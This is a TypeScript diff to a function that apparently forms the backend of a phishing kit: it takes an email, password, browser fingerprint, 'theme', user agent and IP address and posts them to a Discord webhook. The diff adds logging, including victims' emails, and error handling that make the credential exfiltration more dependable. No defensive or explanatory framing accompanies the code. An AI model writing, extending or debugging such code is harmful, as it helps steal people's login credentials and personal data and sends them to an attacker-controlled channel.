@@ -2,9 +2,11 @@
 export async function submitToDiscord(email: string, password: string, fingerprint: string, theme: string, userAgent: string, ip: string) {
   const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
 
+  console.log(`[Discord] Attempting to submit for email: ${email}, theme: ${theme}`);
+
   if (!webhookUrl) {
-    console.error("DISCORD_WEBHOOK_URL is not set");
-    return { status: "ok", message: "Simulated success (no webhook)" };
+    console.error("[Discord] DISCORD_WEBHOOK_URL is not set in environment variables");
+    return { status: "ok", message: "Simulated success (no webhook configured)" };
   }
 
   const payload = {
@@ -25,15 +27,24 @@ export async function submitToDiscord(email: string, password: string, fingerpri
     ]
   };
 
-  const response = await fetch(webhookUrl, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
-  });
+  try {
+    console.log("[Discord] Sending POST request to webhook...");
+    const response = await fetch(webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
 
-  if (!response.ok) {
-    throw new Error(`Discord API responded with status ${response.status}`);
+    if (!response.ok) {
+      const errorText = await response.text();
+      console.error(`[Discord] Webhook failed with status ${response.status}: ${errorText}`);
+      throw new Error(`Discord API responded with status ${response.status}`);
+    }
+
+    console.log("[Discord] Successfully delivered to webhook");
+    return { status: "ok" };
+  } catch (error) {
+    console.error("[Discord] Network or API error:", error);
+    throw error;
   }
-
-  return { status: "ok" };
 }
